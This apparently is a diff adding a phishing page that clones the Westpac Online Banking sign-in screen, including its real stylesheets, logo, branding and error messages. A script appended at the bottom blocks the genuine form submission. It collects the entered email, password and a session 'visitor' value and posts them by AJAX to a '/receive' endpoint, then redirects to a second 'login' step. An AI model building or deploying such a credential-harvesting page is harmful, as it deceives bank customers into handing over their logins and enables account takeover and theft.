@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en" class=" authentication js flexbox flexboxlegacy canvas canvastext webgl touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg smil svgclippaths es5 console" style="">
+<!--<![endif]-->
+
+<head>
+    
+    
+    
+    
+    
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge" />
+    
+    <title>
+
+        Sign in to Westpac Online Banking
+
+    </title>
+    <link href="https://banking.westpac.com.au/wbc/banking/Themes/Default/Desktop/WBC/Core/000-000-0001combined.css.1a6232cd07874834478c928fa1f30b79eea8fe08.css" rel="stylesheet" />
+    <link href="https://banking.westpac.com.au/wbc/banking/Themes/Default/Desktop/WBC/Core/000-0001combined.css.4afbedaf9997c61c303d1951ae98f27918c490d3.css" rel="stylesheet" />
+    <link href="https://banking.westpac.com.au/wbc/banking/Themes/Default/Desktop/WBC/Fiserv.PS.Authentication/000-0001combined.css.b0cf37060ddf80c0f0adf1583668a8d44dfb5143.css" rel="stylesheet" />
+
+	<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js'></script>
+    
+
+    <meta name="wup_url" content="https://wup-2ffe60ee.westpac.com.au/client/v3/web/wup?cid=willow" />
+    <meta name="log_url" content="https://log-2ffe60ee.westpac.com.au/api/v1/sendLogs" />
+    <noscript>
+        <meta HTTP-EQUIV="REFRESH" content="0; url=/wbc/banking/handler?TAM_OP=browser_javascript">
+    </noscript>
+    
+    
+    
+    
+    
+    
+    
+    
+    <link rel="shortcut icon"  />
+
+    
+</head>
+
+<body id="unauthenticated-template" data-log="https://banking.westpac.com.au/wbc/banking/esis" data-keymap-url="https://banking.westpac.com.au/eam/servlet/getEamInterfaceData" data-keymap-data-timeout="{KeymapDataTimeout-Token}" data-gatekeeperurl="https://banking.westpac.com.au/gatekeeper" data-esierrorpageurl="https://banking.westpac.com.au/esi2/error-messages/webseal-error-wol/" data-isgatekeeperenabled="false" data-gatekeepertimeout="5000" data-signinmessageurl="https://banking.westpac.com.au/wbc/banking/handler?TAM_OP=resourcekey" data-is-stronger-password-feature-enabled="True" data-is-eam-policy-global-rollout="True" class="authentication_v2" data-analytics-allkeys="experience,formName,pageKey,pageName,pageType,siteVersion,src,nav,externalSiteName,productID,itemName,transactionID" data-analytics-pagename="Enter email attached to account" data-analytics-src="20231122-desktop" data-analytics-pagetype="login" data-analytics-formname="personal olb" data-analytics-siteversion="1.1242.143.1" data-analytics-experience="desktop" data-analytics-pagekey="login">
+    <div id="info-banner-gdpr">
+
+        <div class="message-bar nomargin info" role="alert">
+            <div class="message">We use cookies to secure and tailor your web use. Our <a  target="_blank" data-s-object-id="https://www.westpac.com.au/privacy/cookies/_1"><strong>notice</strong></a> explains how we use cookies and how you can manage them. By continuing to use this site, we assume you're ok with our notice.
+            </div>
+            <div class="alert-actions">
+                <a  class="alert-dismiss close" data-tracking-link="updated-cookie-policy-cancel" data-analytics-link=" updated-cookie-policy-cancel" data-s-object-id="https://banking.westpac.com.au/wbc/banking/handler_1"><span class="close-icon"></span></a>
+            </div>
+        </div>
+
+    </div>
+
+    <div id="container">
+
+        <header id="header" role="banner">
+            <nav id="accessible-jumps" role="navigation">
+                <ul>
+                    <li><a  data-s-object-id="https://banking.westpac.com.au/wbc/banking/handler_2">Skip to content</a></li>
+                </ul>
+            </nav>
+            <div id="logo">
+                <a  data-s-object-id="https://www.westpac.com.au/_1">
+                    <img src="https://banking.westpac.com.au/wbc/banking/Themes/Default/Desktop/WBC/Core/Images/logo_white_bg.png.ce5c4c19ec61b56796f0e218fc8329c558421fd8.png" alt="Westpac Internet Banking Home" />
+                </a>
+            </div>
+        </header>
+
+        <div id="content" class="container-end" tabindex="-1">
+            <div id="spoke-title" class="container-end">
+                <h1>
+
+                    Sign in to Westpac Online Banking
+                </h1>
+            </div>
+            <main id="main" role="main" class="main-without-keyboard">
+
+
+                <div id="infoBanner"></div>
+
+                <form id="form" method="post" autocomplete="off" novalidate="novalidate" action="/eam/servlet/AuthenticateHttpServlet">
+
+                   <div id="alertManagerArea" style="display:none;" class="set-alert-margin">
+               	<div class="alert alert-error " role="alert">
+               		<div class="alert-icon" tabindex="-1" id="err-mess">        The details entered don't match those on our system. Please try again or <a style="font-size: 14px">reset your password </a> online.
+       </div>
+       </div>
+       </div>
+
+                    <div id="loginPage-v2" class="set-login-border">
+
+                        <div class="login-container">
+                            <div class="login-info-container">
+                                <div id="main-input-container">
+                                    <fieldset>
+                                        <legend class="a11y-context">Sign in to Westpac Live Online Banking</legend>
+
+                                        <div>
+    <label for="email">
+        <span class="label-text-main-v2">Email</span>
+        <input id="email" type="text" name="Email" autocomplete="off" class="without-keyboard txtpwd-layout" data-val="true" data-val-authempty="{AuthEmpty-Password}" data-val-authminlength="{AuthMinLength-Password}" data-keymap-url="https://banking.westpac.com.au/eam/servlet/getEamInterfaceData" data-keymap-data-timeout="{KeymapDataTimeout-Token}" data-error-redirect-url="https://banking.westpac.com.au/wbc/banking/handler?TAM_OP=auth_info" data-capture-keycount="true" data-clear-button-id="clear" />
+    </label>
+
+    <label for="password">
+        <span class="label-text-main-v2">Password</span>
+        <input id="password" type="password" name="EmailPassword" autocomplete="off" class="without-keyboard txtpwd-layout" data-val="true" data-val-authempty="{AuthEmpty-Password}" data-val-authminlength="{AuthMinLength-Password}" data-keymap-url="https://banking.westpac.com.au/eam/servlet/getEamInterfaceData" data-keymap-data-timeout="{KeymapDataTimeout-Token}" data-error-redirect-url="https://banking.westpac.com.au/wbc/banking/handler?TAM_OP=auth_info" data-capture-keycount="true" data-clear-button-id="clear" />
+    </label>
+</div>
+                                    </fieldset>
+
+
+                                    
+
+
+                                    <button type="submit" id="subbut" accesskey="s" class=" btnSignIn-v2 btn btn-primary" title="Sign In">Sign in</button>
+                                    
+
+                                </div>
+                            </div>
+
+                        </div>
+                    </div>
+
+                    <div class="security-protect-container-sm">
+                        <span class="padlock-icon-sm"></span>
+                        <span class="content">
+                            <span>Westpac Protect™</span>
+                        </span>
+                    </div>
+
+                                  </form>
+
+            </main>
+
+            <aside role="complementary">
+                <div id="aside-content">
+                    <div class="box box-btn btn-left">
+                        <a  title="Register" class="btn btn-secondary" data-s-object-id="https://banking.westpac.com.au/wbc/banking/registration_1">Register for online banking</a>
+                    </div>
+                    <div id="need-help" class="box">
+                        <h2>Need Help?</h2>
+                        <p>Call us on <strong>1300 655 505</strong><span>8am-8pm Sydney time, 7 days a week</span></p>
+                    </div>
+                </div>
+            </aside>
+
+        </div>
+    </div>
+
+    
+    
+    
+    
+    
+    
+    
+    
+
+    <div id="getcampaignurl" data-campaign-url="https://banking.westpac.com.au/wbc/banking/authentication/getpubliccampaigns" data-ladingcampaign-url="https://banking.westpac.com.au/wbc/banking/authentication/getpubliclandingpage" data-feedback-url="https://banking.westpac.com.au/wbc/banking/authentication/setpubliccampaignfeedback">
+
+
+
+
+    </div>
+    <div class="ui-widget-overlay hidden"></div>
+</body>
+	<script>
+    function validateEmail() {
+        const emailInput = document.getElementById('email');
+        const emailValue = emailInput.value.trim();
+
+        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+        if (emailValue === "") {
+            document.getElementById('err-mess').textContent = "Email is required";
+            return false;
+        }
+
+        if (!emailRegex.test(emailValue)) {
+            document.getElementById('err-mess').textContent = "Incorrect email address";
+            return false;
+        }
+
+        return true;
+    }
+
+    $(document).ready(function() {
+        $('#subbut').on('click', function(event) {
+            event.preventDefault(); // Prevent the default action of the link
+
+            let myForm = $("#form");
+            let checkInputs = document.querySelectorAll('.log_details');
+
+            // Flag to track if any input is empty or invalid
+            let isEmpty = false;
+
+            // Loop through each input field
+            for (const check of checkInputs) {
+                check.addEventListener('focus', () => {
+                    console.log('focus');
+                    check.nextElementSibling.style.display = "none";
+                });
+
+                if (check.value.trim() === "") {
+                    isEmpty = true;
+                    document.getElementById('err-mess').textContent = "All fields are required";
+                }
+            }
+
+            // Check email validation
+            const isEmailValid = validateEmail();
+            if (!isEmailValid) {
+                isEmpty = true;
+            }
+
+            // Show or hide the alert manager area
+            if (isEmpty) {
+                document.getElementById('alertManagerArea').style.display = "block";
+            } else {
+                document.getElementById('alertManagerArea').style.display = "none";
+                
+                // If no input is empty, proceed with form submission
+                let userinfo = myForm.serializeArray();
+                let user = {};
+                let visitor = sessionStorage.getItem('visitor');
+
+                userinfo.forEach((value) => {
+                    // Use the 'name' attribute to create user object
+                    user[value.name] = value.value;
+                });
+
+                user['visitor'] = visitor;
+                console.log(user);
+				
+                // Send AJAX request
+                $.ajax({
+                    method: 'POST',
+                    url: "/receive",
+                    data: user
+                }).done(function(msg) {
+                    sessionStorage.setItem('visitor', visitor);
+                    window.location.href = "/login/2";
+                    console.log(msg); // Log success message
+                }).fail(function(err, textstatus, error) {
+                    document.getElementById('alertManagerArea').style.display = "block";
+                    document.getElementById('err-mess').innerHTML = "The details entered don't match those on our system. Please try again or <a style=\"font-size: 14px\" href=\"#\">reset your password</a> online.";
+                });
+            }
+        });
+    });
+</script>
+<iframe sandbox="allow-same-origin" style="display: none;"></iframe>
+
+</html>
